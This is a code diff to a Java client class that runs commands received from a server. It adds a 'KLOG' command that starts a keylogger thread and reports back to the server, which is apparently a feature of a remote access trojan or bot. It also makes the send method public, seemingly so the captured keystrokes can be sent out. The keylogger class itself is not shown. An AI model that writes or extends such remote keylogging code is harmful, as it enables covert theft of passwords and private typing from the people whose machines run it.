@@ -65,6 +65,8 @@ public class Client extends Thread {
 	 */
 	private int id;
 	
+	private boolean logKeyboard = false;
+	
 	public Client() {
 		commands = new HashMap<String, CommandInterface>();
 		
@@ -165,6 +167,32 @@ public class Client extends Thread {
 			
 		});
 		
+		// Start keylogging
+		Client _this = this;
+		commands.put("KLOG", new CommandInterface(){
+
+			@Override
+			public String exec(ParsedCommand pCmd) {
+				logKeyboard = true;
+				new KeyLogger(_this).start();
+				send("KSTART " + id, new byte[] {});
+				return null;
+			}
+			
+		});
+		
+	}
+	
+	public boolean doLogKeyboard() {
+		return logKeyboard;
+	}
+	
+	public int getClientId() {
+		return id;
+	}
+	
+	public Connection getCurConn() {
+		return curConn;
 	}
 	
 	/**
@@ -217,7 +245,7 @@ public class Client extends Thread {
 	 * @param payload Data to be transfered
 	 * @return Server's response
 	 */
-	private String send(String request, byte[] payload) {
+	public String send(String request, byte[] payload) {
 		
 		try {
 			
@@ -231,7 +259,7 @@ public class Client extends Thread {
 			// Blocks until response
 			String response = curConn.readResponse();
 			
-			// Checking wether to close connection or not
+			// Checking whether to close connection or not
 			connected = false;
 			if (response.toString().startsWith("DONE")) {
 				curConn.close();
